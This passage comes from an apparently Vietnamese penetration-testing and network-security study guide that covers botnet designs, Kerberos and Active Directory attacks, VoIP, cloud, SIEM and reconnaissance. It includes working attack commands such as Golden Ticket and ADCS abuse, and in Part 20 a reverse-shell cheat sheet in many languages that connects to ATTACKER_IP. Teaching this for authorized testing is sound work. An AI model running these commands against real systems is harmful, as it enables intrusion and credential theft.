   - HAProxy: timeout http-request 5s
```

## 13.5 Botnet Architecture

```
=== Centralized C2 ===
                   ┌──────┐
                   │  C2  │
                   └──┬───┘
           ┌──────┬──┴──┬──────┐
           │      │     │      │
         Bot1   Bot2  Bot3   Bot4
Ưu: Dễ quản lý     Nhược: Single point of failure

=== P2P Botnet ===
         Bot1 ←→ Bot2
           ↕        ↕
         Bot3 ←→ Bot4
Ưu: Resilient, khó takedown     Nhược: Chậm command propagation

=== Domain Generation Algorithm (DGA) ===
Bot tự generate random domain hàng ngày
Bot master register domain trước → C2
Law enforcement khó block vì domain thay đổi liên tục
Ví dụ: Conficker tạo 50,000 domain/ngày

=== Fast Flux ===
Domain resolve đến nhiều IP khác nhau (bot IPs)
IP thay đổi liên tục (TTL rất thấp)
→ Khó trace back đến real C2
```

---

# PHẦN 14: KERBEROS & ACTIVE DIRECTORY NETWORKING

## 14.1 Kerberos Protocol Deep Dive

### Kerberos Components

```
KDC (Key Distribution Center) = chạy trên Domain Controller
├── AS (Authentication Service): Xác thực user, cấp TGT
└── TGS (Ticket Granting Service): Cấp service ticket

TGT (Ticket Granting Ticket): "Giấy thông hành" chứng minh user đã xác thực
Service Ticket (TGS): "Vé" truy cập service cụ thể
```

### Kerberos Authentication Flow

```
┌────────┐         ┌──────┐         ┌─────────┐
│ Client │         │  KDC │         │ Service │
└───┬────┘         └──┬───┘         └────┬────┘
    │                  │                  │
    │ 1. AS-REQ        │                  │
    │ (username,       │                  │
    │  timestamp       │                  │
    │  encrypted with  │                  │
    │  user's hash)    │                  │
    │─────────────────>│                  │
    │                  │                  │
    │ 2. AS-REP        │                  │
    │ (TGT encrypted   │                  │
    │  with krbtgt hash,│                 │
    │  session key      │                 │
    │  encrypted with   │                 │
    │  user's hash)    │                  │
    │<─────────────────│                  │
    │                  │                  │
    │ 3. TGS-REQ       │                  │
    │ (TGT + SPN of    │                  │
    │  target service) │                  │
    │─────────────────>│                  │
    │                  │                  │
    │ 4. TGS-REP       │                  │
    │ (Service Ticket   │                 │
    │  encrypted with   │                 │
    │  service's hash) │                  │
    │<─────────────────│                  │
    │                  │                  │
    │ 5. AP-REQ (Service Ticket)          │
    │────────────────────────────────────>│
    │                  │                  │
    │ 6. AP-REP (Optional mutual auth)    │
    │<────────────────────────────────────│
```

### Kerberos Attacks

```bash
# === Kerberoasting ===
# Nguyên lý: Service Ticket (TGS) encrypted bằng service account password hash
# Bất kỳ domain user nào cũng xin được TGS cho bất kỳ SPN
# → Request TGS → Offline crack hash

# Tìm SPN accounts
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.1

# Request TGS và crack
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.1 -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt

# Với Rubeus (trên Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# === AS-REP Roasting ===
# Nguyên lý: Account có "Do not require Kerberos pre-authentication" enabled
# → Ai cũng request được AS-REP → chứa hash encrypted với user password → crack

# Tìm AS-REP roastable accounts
GetNPUsers.py domain/ -dc-ip 192.168.1.1 -usersfile users.txt -no-pass -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt

# === Golden Ticket ===
# Nguyên lý: Nếu có krbtgt hash → tạo TGT tùy ý (bất kỳ user, bất kỳ group)
# → Truy cập MỌI THỨ trong domain

# Lấy krbtgt hash (cần Domain Admin):
mimikatz> lsadump::dcsync /user:krbtgt

# Tạo Golden Ticket:
mimikatz> kerberos::golden /user:Administrator /domain:target.com \
  /sid:S-1-5-21-... /krbtgt:hash /ptt

# Với ticketer (Impacket)
ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... \
  -domain target.com Administrator

# === Silver Ticket ===
# Giống Golden nhưng cho 1 service cụ thể
# Chỉ cần service account hash (không cần krbtgt)
mimikatz> kerberos::golden /user:Administrator /domain:target.com \
  /sid:S-1-5-21-... /target:server.target.com \
  /service:cifs /rc4:service_hash /ptt

# === Unconstrained Delegation ===
# Server được phép delegate TGT của user cho bất kỳ service nào
# Compromise server này → steal TGT của bất kỳ ai connect đến

# Tìm unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# === Constrained Delegation Abuse ===
# S4U2Self + S4U2Proxy → impersonate bất kỳ user
getST.py -spn cifs/target.com -impersonate Administrator \
  domain/service_account:password -dc-ip 192.168.1.1

# === Resource-Based Constrained Delegation (RBCD) ===
# Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute
rbcd.py -delegate-from attacker$ -delegate-to target$ \
  -action write domain/user:password
getST.py -spn cifs/target.com -impersonate Administrator \
  domain/attacker$:password
```

## 14.2 AD Certificate Services (ADCS) Attacks

```bash
# === ESC1: Misconfigured Certificate Template ===
# Template cho phép: enrollee supplies subject (SAN)
# → Request cert cho Domain Admin!
certipy find -u user@target.com -p password -dc-ip 192.168.1.1 -vulnerable

certipy req -u user@target.com -p password -ca CA-NAME \
  -template VulnTemplate -upn administrator@target.com

certipy auth -pfx administrator.pfx

# === ESC8: NTLM Relay to ADCS HTTP Enrollment ===
# Relay NTLM auth đến ADCS web enrollment → get cert as victim
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Nhiều ESC variants (ESC1-ESC13+)
# Dùng Certipy hoặc Certify để tìm và exploit
```

## 14.3 ADIDNS Poisoning

```bash
# Nguyên lý: AD-Integrated DNS cho phép authenticated users tạo record
# → Tạo wildcard record (*.domain) → capture traffic

# Dùng Inveigh hoặc dnstool.py
python3 dnstool.py -u 'domain\user' -p password -a add \
  -r '*.target.com' -d attacker-ip dc-ip
```

---

# PHẦN 15: AAA & NETWORK ACCESS CONTROL

## 15.1 RADIUS (Remote Authentication Dial-In User Service)

```
Port: UDP 1812 (Authentication), 1813 (Accounting)
Dùng cho: Wi-Fi 802.1X, VPN authentication, network device login

Flow:
Client → NAS (Network Access Server) → RADIUS Server → AD/LDAP

┌────────┐     ┌──────┐     ┌────────┐     ┌──────┐
│ Client │ ──→ │ NAS  │ ──→ │ RADIUS │ ──→ │ AD/  │
│        │     │(AP/  │     │ Server │     │ LDAP │
│        │     │Switch│     │(FreeRADIUS)│  │      │
└────────┘     └──────┘     └────────┘     └──────┘

RADIUS Packets:
  Access-Request    → NAS gửi credentials lên RADIUS
  Access-Accept     → RADIUS cho phép
  Access-Reject     → RADIUS từ chối
  Access-Challenge  → RADIUS yêu cầu thêm thông tin
  Accounting-Request → Log session (start/stop/interim)

# FreeRADIUS setup
apt install freeradius
# Config: /etc/freeradius/3.0/
# clients.conf: Định nghĩa NAS devices
# users: User database
# radiusd.conf: Main config

# Testing
radtest user password radius-server 0 shared_secret

# Security issues:
# Shared secret yếu → brute force
# RADIUS traffic (ngoài password) KHÔNG encrypted
# → Dùng RADSEC (RADIUS over TLS) cho transit security
```

## 15.2 TACACS+ (Terminal Access Controller Access-Control System Plus)

```
Port: TCP 49
Dùng cho: Network device authentication (Cisco, Juniper)
Khác RADIUS: Encrypt TOÀN BỘ packet (không chỉ password)
Tách biệt Authentication, Authorization, Accounting (AAA)

So sánh RADIUS vs TACACS+:
┌──────────────┬───────────────┬────────────────┐
│ Feature      │ RADIUS        │ TACACS+        │
├──────────────┼───────────────┼────────────────┤
│ Transport    │ UDP           │ TCP            │
│ Encryption   │ Password only │ Full packet    │
│ AAA          │ Combined      │ Separate       │
│ Use case     │ Network access│ Device admin   │
│ Standard     │ Open          │ Cisco          │
└──────────────┴───────────────┴────────────────┘
```

## 15.3 802.1X (Port-Based Network Access Control)

```
Components:
  Supplicant: Client muốn truy cập mạng (laptop/phone)
  Authenticator: Switch/AP kiểm soát port
  Authentication Server: RADIUS server

Flow:
┌──────────┐     ┌──────────────┐     ┌────────┐
│Supplicant│ ──→ │Authenticator │ ──→ │RADIUS  │
│(Client)  │ EAP │(Switch/AP)   │RADIUS│Server  │
└──────────┘     └──────────────┘     └────────┘

1. Client kết nối → port ở trạng thái "unauthorized"
2. Switch gửi EAP-Request/Identity
3. Client trả EAP-Response/Identity (username)
4. Switch forward lên RADIUS
5. RADIUS challenge → client authenticate
6. RADIUS Accept → switch chuyển port sang "authorized"

EAP Methods:
  EAP-TLS:      Certificate-based (mạnh nhất, cần PKI)
  PEAP:         Server cert + username/password (phổ biến nhất)
  EAP-TTLS:     Giống PEAP nhưng linh hoạt hơn
  EAP-FAST:     Cisco, dùng PAC (Protected Access Credential)

# 802.1X Bypass Techniques:
# 1. MAC Bypass (MAB): Nếu device không hỗ trợ 802.1X
#    → Switch fallback cho phép dựa trên MAC → Spoof MAC
# 2. NAC bypass: Clone MAC + IP của authorized device
# 3. Hub trick: Cắm hub giữa authorized device và switch
#    → Hai device share port
# 4. VLAN hopping sau khi authenticate
# 5. EAP downgrade attack
```

## 15.4 NAC (Network Access Control) Solutions

```
Cisco ISE, Aruba ClearPass, FortiNAC, PacketFence (open source)

NAC checks:
  - Identity: Ai?
  - Posture: Antivirus updated? OS patched? Firewall on?
  - Compliance: Corporate policy compliance
  
Actions:
  - Allow full access
  - Quarantine VLAN (chỉ cho patch/update)
  - Deny access
  - Guest VLAN

# NAC Bypass:
# Spoof compliant device's MAC + IP
# Modify HTTP User-Agent để bypass posture check
# VLAN manipulation sau khi vào quarantine VLAN
```

---

# PHẦN 16: VoIP / SIP ATTACKS

## 16.1 SIP (Session Initiation Protocol)

```
Port: UDP/TCP 5060 (SIP), 5061 (SIPS/TLS)
RTP: UDP 10000-20000 (Real-time Transport Protocol - actual voice)

SIP Methods:
  INVITE    → Start call
  ACK       → Confirm
  BYE       → End call
  REGISTER  → Register with SIP server
  CANCEL    → Cancel pending request
  OPTIONS   → Query capabilities

SIP Call Flow:
  Caller → INVITE → SIP Proxy → INVITE → Callee
  Callee → 180 Ringing → SIP Proxy → 180 Ringing → Caller
  Callee → 200 OK → SIP Proxy → 200 OK → Caller
  Caller → ACK → Callee
  [RTP Media Stream directly between Caller ↔ Callee]
  Caller → BYE → Callee
  Callee → 200 OK → Caller
```

## 16.2 VoIP Attacks

```bash
# === SIP Enumeration ===
svmap 192.168.1.0/24                           # Find SIP devices
svwar -m INVITE -e 100-999 192.168.1.100       # Enumerate extensions

# === SIP Brute Force ===
sipvicious: svcrack -u 100 -d wordlist.txt 192.168.1.100

# === VoIP Eavesdropping ===
# MITM (ARP spoof) → capture RTP → decode audio
# Wireshark: Telephony → VoIP Calls → Play Streams

# === Toll Fraud ===
# Register giả lên SIP server → gọi international

# === SRTP (Secure RTP) ===
# Encrypted voice → không nghe lén được
# ZRTP: End-to-end encryption cho VoIP

# === SIP specific tools ===
# SIPVicious Suite: svmap, svwar, svcrack
# VoIPER: Fuzzer cho SIP
# Owasp VoIP Security: Testing methodology
```

---

# PHẦN 17: CLOUD NETWORKING & SECURITY

## 17.1 AWS Networking

```
VPC (Virtual Private Cloud):
  CIDR block: 10.0.0.0/16 (ví dụ)
  ├── Public Subnet:  10.0.1.0/24 (có Internet Gateway)
  ├── Private Subnet: 10.0.2.0/24 (không có IGW)
  └── Database Subnet: 10.0.3.0/24

Components:
  Internet Gateway (IGW): Kết nối VPC ra Internet
  NAT Gateway: Cho private subnet ra Internet (outbound only)
  Route Table: Routing rules cho mỗi subnet
  Security Group: Stateful firewall per instance (allow rules only)
  Network ACL: Stateless firewall per subnet (allow + deny rules)
  VPC Peering: Kết nối 2 VPC (same/cross account)
  Transit Gateway: Hub kết nối nhiều VPC + on-premises
  VPC Endpoint: Truy cập AWS services mà không qua Internet
  PrivateLink: Expose service cho VPC khác qua private connection

Security Group vs NACL:
┌──────────────┬──────────────────┬──────────────────┐
│              │ Security Group   │ NACL             │
├──────────────┼──────────────────┼──────────────────┤
│ Level        │ Instance (ENI)   │ Subnet           │
│ Stateful     │ Yes              │ No               │
│ Rules        │ Allow only       │ Allow + Deny     │
│ Evaluation   │ All rules        │ In order (number)│
│ Default      │ Deny all inbound │ Allow all        │
└──────────────┴──────────────────┴──────────────────┘

# Common misconfigs:
# Security Group: 0.0.0.0/0 cho port 22/3389 (SSH/RDP open to world)
# S3 bucket policy public
# IMDSv1 → SSRF → steal IAM credentials
# VPC Flow Logs not enabled
```

## 17.2 Azure Networking

```
Virtual Network (VNet): Tương đương AWS VPC
Network Security Group (NSG): Tương đương Security Group + NACL
Azure Firewall: Managed firewall service
Application Gateway: L7 load balancer + WAF
VNet Peering: Kết nối VNet
ExpressRoute: Dedicated connection (tương đương AWS Direct Connect)
Private Endpoint: Truy cập Azure service qua private IP
```

## 17.3 Container Networking

```
=== Docker Networking ===
Modes:
  bridge (default): Container trên cùng bridge network nói chuyện được
  host: Container dùng host network stack (không isolation)
  none: Không network
  overlay: Multi-host networking (Docker Swarm)
  macvlan: Container có MAC address riêng trên physical network

# Docker network commands
docker network ls
docker network inspect bridge
docker network create --driver bridge my-network
docker run --network my-network nginx

# Security:
# Container mặc định có thể nói chuyện với nhau trên cùng bridge
# → Dùng network segmentation
# --icc=false: Disable inter-container communication
# Docker daemon listens on unix socket by default
# Exposing TCP socket (2375/2376) → RCE nếu không auth!

=== Kubernetes Networking ===
Pod-to-Pod: Tất cả pod nói chuyện được (flat network)
Service: Load balance traffic đến pods
Ingress: L7 routing (HTTP host/path → service)
NetworkPolicy: Firewall rules giữa pods

CNI Plugins: Calico, Cilium, Flannel, Weave

# NetworkPolicy ví dụ: Chỉ cho phép frontend → backend
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-policy
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080

# Kubernetes security:
# API Server exposed → kubectl access
# etcd unencrypted → secrets leak
# ServiceAccount token mount → lateral movement
# Kubelet API (10250) unauthenticated → RCE
```

## 17.4 Zero Trust Network Architecture (ZTNA)

```
Nguyên tắc: "Never trust, always verify"
Không tin bất kỳ traffic nào, kể cả từ internal network.

Core Principles:
1. Verify explicitly: Authenticate mọi request
2. Least privilege: Tối thiểu quyền cần thiết
3. Assume breach: Thiết kế như đã bị compromise

Components:
  - Identity Provider (IdP): Azure AD, Okta
  - Policy Engine: Quyết định allow/deny dựa trên context
  - Policy Enforcement Point: Enforce quyết định
  - Microsegmentation: Firewall từng workload
  - Continuous monitoring: Liên tục evaluate trust

vs Traditional (Perimeter-based):
  Traditional: Trust internal, distrust external (castle-and-moat)
  Zero Trust: Trust nothing, verify everything

Implementation:
  - BeyondCorp (Google): Pioneer Zero Trust
  - Azure AD Conditional Access
  - Zscaler Private Access
  - Cloudflare Access
```

---

# PHẦN 18: DEFENSE & MONITORING

## 18.1 SIEM (Security Information and Event Management)

```
SIEM = Thu thập log + Correlate events + Alert

Popular SIEMs:
  - Splunk (enterprise, expensive)
  - ELK Stack / Elastic SIEM (open source)
  - Wazuh (open source, HIDS + SIEM)
  - Microsoft Sentinel (cloud, Azure)
  - QRadar (IBM)

=== ELK Stack ===
Elasticsearch: Search engine, lưu trữ log
Logstash: Thu thập, parse, transform log
Kibana: Visualization, dashboard
Beats: Lightweight shipper (Filebeat, Packetbeat, Winlogbeat)

Architecture:
  Sources → Beats/Logstash → Elasticsearch → Kibana
  
# Filebeat config cho syslog
filebeat.inputs:
- type: syslog
  protocol.tcp:
    host: "0.0.0.0:514"
output.elasticsearch:
  hosts: ["localhost:9200"]

=== Splunk ===
# Search query language (SPL)
index=main sourcetype=syslog "failed password"
index=main sourcetype=syslog src_ip=10.10.10.100 | stats count by dest_port
index=main sourcetype=firewall action=blocked | timechart count by src_ip

# Detect brute force
index=main sourcetype=syslog "Failed password"
| stats count by src_ip
| where count > 10

# Detect port scan
index=main sourcetype=firewall
| stats dc(dest_port) as unique_ports by src_ip
| where unique_ports > 50

=== Wazuh ===
# Agent-based: Deploy agent trên mỗi host
# Chức năng: Log analysis, file integrity monitoring,
#            rootkit detection, compliance checking
# Rules: XML-based, tương thích OSSEC
# API: RESTful, integrate với ELK
```

## 18.2 NetFlow / sFlow / IPFIX

```
NetFlow (Cisco): Export flow metadata từ router/switch
sFlow: Sampling-based flow monitoring
IPFIX: Standardized NetFlow v10

Flow record bao gồm:
  Source IP, Dest IP, Source Port, Dest Port,
  Protocol, Bytes, Packets, Timestamps, Interfaces

# Tại sao quan trọng cho security?
# Phát hiện: Data exfiltration (traffic lớn ra ngoài bất thường)
# Phát hiện: Lateral movement (internal traffic patterns thay đổi)
# Phát hiện: C2 beaconing (periodic connections đến external IP)
# Phát hiện: DDoS (traffic spike)

# Tools:
# nfdump/nfsen: NetFlow collector/analyzer
# ntopng: Real-time network traffic analysis
# SiLK: Network flow analysis

# Detect C2 beaconing pattern:
# Tìm connection với interval đều đặn (ví dụ mỗi 60 giây)
# → Periodic pattern + external destination + small data = suspicious
```

## 18.3 Honeypots & Honeynets

```
Honeypot: Hệ thống giả mạo, thu hút attacker để:
  1. Detect intrusion (early warning)
  2. Study attacker TTPs (Tactics, Techniques, Procedures)
  3. Deflect from real assets

Types:
  Low-interaction: Giả lập services (ít risk, dễ deploy)
  High-interaction: Real OS/services (nhiều info, nhiều risk)

# === Cowrie (SSH/Telnet Honeypot) ===
# Giả lập SSH server, log mọi thứ attacker làm
docker run -p 2222:2222 cowrie/cowrie

# Log: Commands, uploads, sessions
# Attacker nghĩ đang SSH vào real server

# === T-Pot (All-in-one) ===
# Bao gồm: Cowrie, Dionaea, Honeytrap, Conpot, v.v.
# Tích hợp ELK cho visualization
# https://github.com/telekom-security/tpotce

# === Dionaea (Malware honeypot) ===
# Giả lập SMB, HTTP, FTP, MSSQL
# Bắt malware samples

# === HoneyD ===
# Giả lập toàn bộ network topology
# Tạo hàng trăm "host" ảo với services

# === Canary Tokens ===
# Không phải honeypot truyền thống
# Tạo file/URL/DNS token → đặt ở nơi chỉ attacker mới access
# Khi access → alert
# https://canarytokens.org
# Ví dụ: Đặt file "passwords.xlsx" (canary) trên share
# → Ai mở = compromise detected
```

## 18.4 Network Hardening (CIS Benchmarks)

```
=== Switch Hardening ===
1. Disable unused ports
2. Port Security (limit MAC per port)
3. DHCP Snooping
4. Dynamic ARP Inspection (DAI)
5. 802.1X on access ports
6. BPDU Guard on access ports
7. Root Guard on distribution ports
8. VLAN access lists (VACL)
9. Private VLANs
10. Disable CDP/LLDP trên edge ports
11. Disable DTP (switchport nonegotiate)
12. Native VLAN ≠ VLAN 1
13. SSH instead of Telnet for management
14. SNMPv3 instead of v1/v2c
15. AAA (RADIUS/TACACS+) for admin login

=== Router Hardening ===
1. Disable unnecessary services (finger, http server, CDP)
2. SSH instead of Telnet
3. ACL on VTY lines (restrict management access)
4. Routing protocol authentication (OSPF MD5, BGP MD5)
5. uRPF (Unicast Reverse Path Forwarding) - anti-spoofing
6. Control plane policing (CoPP)
7. Disable source routing
8. SNMP v3 with authentication + encryption
9. NTP authentication
10. Syslog to external server
```

---

# PHẦN 19: OSINT & RECONNAISSANCE TOOLS

## 19.1 Passive Reconnaissance

### Shodan - Search Engine for IoT/Devices

```bash
# Web: https://shodan.io
# CLI:
pip install shodan
shodan init YOUR_API_KEY

# Tìm device theo service
shodan search "apache" --limit 10
shodan search "port:22 country:VN"
shodan search "webcamxp"
shodan search "default password"

# Tìm target cụ thể
shodan host 8.8.8.8
shodan domain example.com

# Shodan Dorks (web):
# org:"Target Company"
# net:203.0.113.0/24
# port:3389 country:VN
# "Server: Apache" "302" city:"Ho Chi Minh"
# vuln:CVE-2021-44228     (tìm Log4Shell!)
# product:nginx version:1.6
# ssl.cert.subject.cn:target.com
# http.title:"Dashboard" port:8080

# Shodan alternatives:
# Censys: https://censys.io (certificate-focused)
# ZoomEye: https://zoomeye.org (Chinese Shodan)
# FOFA: https://fofa.info
```

### Amass - Subdomain Enumeration

```bash
# Passive enumeration
amass enum -passive -d target.com

# Active enumeration (DNS brute force + resolution)
amass enum -active -d target.com -brute

# Với config (nhiều data sources)
amass enum -d target.com -config amass_config.yaml

# Output
amass enum -d target.com -o subdomains.txt

# Visualization
amass viz -d target.com -o graph.html
```

### Subfinder + httpx combo

```bash
# Tìm subdomain
subfinder -d target.com -o subs.txt

# Check subdomain nào alive
cat subs.txt | httpx -status-code -title -tech-detect -o alive.txt

# Full recon pipeline
subfinder -d target.com -silent | httpx -silent | nuclei -t cves/
```

### Google Dorks

```
site:target.com                         # Chỉ kết quả từ target.com
site:target.com filetype:pdf            # Tìm PDF
site:target.com inurl:admin             # Tìm admin panel
site:target.com intitle:"index of"      # Directory listing
site:target.com ext:sql | ext:db        # Database files
site:target.com intext:"password"       # Password trong page
"target.com" ext:log                    # Log files
"target.com" ext:conf | ext:cfg        # Config files
site:pastebin.com "target.com"          # Leaks trên Pastebin
site:github.com "target.com" password   # Credentials trên GitHub
inurl:"wp-admin" site:target.com        # WordPress admin
```

### Nessus / OpenVAS - Vulnerability Scanners

```bash
# === OpenVAS (Free) ===
# Cài đặt
sudo apt install gvm
sudo gvm-setup
sudo gvm-start
# Truy cập: https://localhost:9392

# OpenVAS CLI
omp -u admin -w password --xml='<create_target>...</create_target>'

# === Nessus (Commercial, free for personal use) ===
# Download từ: https://www.tenable.com/products/nessus
# Truy cập: https://localhost:8834
# Scan types: Basic Network Scan, Advanced Scan, Web Application
# Policies: Customize checks
# Compliance: CIS benchmarks, PCI DSS

# So sánh:
# Nessus: Nhiều plugin hơn, UI tốt hơn, commercial support
# OpenVAS: Free, community-driven, đủ dùng cho lab
```

## 19.2 Web Enumeration Tools

```bash
# === Gobuster (Directory/file brute force) ===
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
gobuster dns -d target.com -w subdomains.txt
gobuster vhost -u http://target.com -w wordlist.txt

# === ffuf (Fuzz Faster U Fool) ===
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ

# Parameter fuzzing
ffuf -w params.txt -u "http://target.com/page?FUZZ=value"

# Virtual host fuzzing
ffuf -w vhosts.txt -u http://target.com -H "Host: FUZZ.target.com" \
  -fs 4242    # Filter by response size

# POST data fuzzing
ffuf -w passwords.txt -X POST -d "user=admin&pass=FUZZ" \
  -u http://target.com/login -fc 401

# === Nikto (Web vulnerability scanner) ===
nikto -h http://target.com
nikto -h http://target.com -ssl         # HTTPS
nikto -h http://target.com -Tuning x    # All tests

# === WhatWeb (Technology fingerprinting) ===
whatweb http://target.com
whatweb -a 3 http://target.com          # Aggressive
```

---

# PHẦN 20: REVERSE SHELLS - TOÀN TẬP

> **CẢNH BÁO**: Reverse shell là kỹ thuật tấn công. CHỈ sử dụng trong authorized penetration testing, CTF competitions, hoặc lab cá nhân. Sử dụng trái phép vi phạm pháp luật.

## 20.1 Reverse Shell là gì?

```
Normal Shell:
  Attacker ──connect──→ Victim:port (SSH, Telnet)
  → Bị firewall block vì inbound connection

Reverse Shell:
  Victim ──connect──→ Attacker:port
  → Bypass firewall vì outbound connection thường cho phép!

Bind Shell:
  Victim mở port, chờ attacker connect
  → Bị firewall block vì listen port
```

## 20.2 Reverse Shell Cheat Sheet

```bash
# === Attacker: Listener ===
nc -lvnp 4444
# Hoặc dùng rlwrap cho history/arrow keys
rlwrap nc -lvnp 4444

# === Bash ===
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# === Python ===
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# === PHP ===
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# === Perl ===
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# === Ruby ===
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# === PowerShell (Windows) ===
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# === Netcat (nếu có -e)===
nc ATTACKER_IP 4444 -e /bin/bash

# === Netcat without -e ===
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# === OpenSSL (Encrypted reverse shell) ===
# Attacker:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
# Victim:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s

# === Socat (Full TTY reverse shell) ===
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

## 20.3 Upgrade Shell to Interactive TTY

```bash
# Bước 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# hoặc
script -qc /bin/bash /dev/null

# Bước 2: Background shell
Ctrl+Z

# Bước 3: Set terminal
stty raw -echo; fg

# Bước 4: Set environment
export TERM=xterm
export SHELL=bash
stty rows 40 columns 160
```

---

# PHẦN 21: IoT & PROTOCOL SECURITY

## 21.1 MQTT (Message Queuing Telemetry Transport)

```
Port: 1883 (plain), 8883 (TLS)
Dùng cho: IoT devices, smart home, sensors
Model: Publish/Subscribe qua Broker

Components:
  Publisher → Broker (Mosquitto, HiveMQ) → Subscriber
  Topic: hierarchical (home/bedroom/temperature)

# Recon MQTT
nmap -sV -p 1883 target
mosquitto_sub -h target -t '#' -v    # Subscribe ALL topics!
# '#' = wildcard tất cả topics → xem tất cả messages

# Nếu broker KHÔNG có authentication:
# → Đọc tất cả sensor data
# → Publish command giả (mở cửa, tắt đèn, v.v.)
mosquitto_pub -h target -t 'home/door/lock' -m 'UNLOCK'

# Tools:
# mqtt-pwn: MQTT pentest framework
# MQTT Explorer: GUI client
```

## 21.2 CoAP (Constrained Application Protocol)

```
Port: UDP 5683
Dùng cho: Resource-constrained IoT devices
Giống HTTP nhưng nhẹ hơn (UDP instead of TCP)
Methods: GET, POST, PUT, DELETE (giống HTTP)

# Scan CoAP
nmap -sU -p 5683 target
coap-client -m get coap://target/.well-known/core    # Discover resources
```

## 21.3 HTTP/2 và HTTP/3 (QUIC)

```
=== HTTP/2 ===
- Binary protocol (thay vì text của HTTP/1.1)
- Multiplexing: Nhiều request trên 1 TCP connection
- Header compression (HPACK)
- Server push
- Stream prioritization

Security implications:
- HTTP/2 request smuggling (khác HTTP/1.1)
- Desync attacks giữa frontend (HTTP/2) và backend (HTTP/1.1)
- HPACK bomb (decompression bomb qua header compression)

=== HTTP/3 (QUIC) ===
- Dựa trên UDP (thay TCP)
- Built-in TLS 1.3
- 0-RTT connection establishment
- Giảm head-of-line blocking
- Connection migration (đổi IP không mất session)

Security:
- UDP-based → khác biệt firewall rules
- 0-RTT replay attacks
- QUIC traffic khó inspect hơn cho IDS/IPS
```

## 21.4 WebSocket Security

```
WebSocket: Full-duplex communication qua 1 TCP connection
Upgrade: HTTP → WebSocket

# Handshake
GET /chat HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

# Response
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade

# Security issues:
# Cross-Site WebSocket Hijacking (CSWSH)
# No same-origin enforcement (phải check Origin header manually)
# Injection trong messages
# Missing authentication after upgrade

# Testing với wscat
npm install -g wscat
wscat -c ws://target.com/ws

# Burp Suite: Proxy → WebSocket History
```

## 21.5 gRPC Security

```
gRPC: High-performance RPC framework (Google)
Protocol: HTTP/2 + Protocol Buffers
Port: Thường 50051

# gRPC reflection (tương tự WSDL discovery)
grpcurl -plaintext target:50051 list        # List services
grpcurl -plaintext target:50051 describe    # Describe methods
grpcurl -plaintext -d '{"name":"test"}' target:50051 package.Service/Method

# Security:
# Nếu reflection enabled → enum toàn bộ API
# Plaintext gRPC (không TLS) → sniffing
# Missing authentication/authorization
# Proto definition leak → understand internal API
```

---

# PHẦN 22: NTP, NFS & OTHER SERVICES

## 22.1 NTP (Network Time Protocol) - Port 123

```bash
# NTP quan trọng vì:
# Kerberos dựa vào time sync (max 5 min skew)
# Log correlation cần time sync
# Certificate validation dựa vào time

# NTP Enumeration
ntpq -p target                    # List NTP peers
nmap --script ntp-info -p 123 target
nmap --script ntp-monlist -p 123 target   # monlist (amplification vector)

# NTP Attacks:
# 1. NTP Amplification DDoS (monlist)
# 2. Time manipulation → break Kerberos, bypass cert expiry
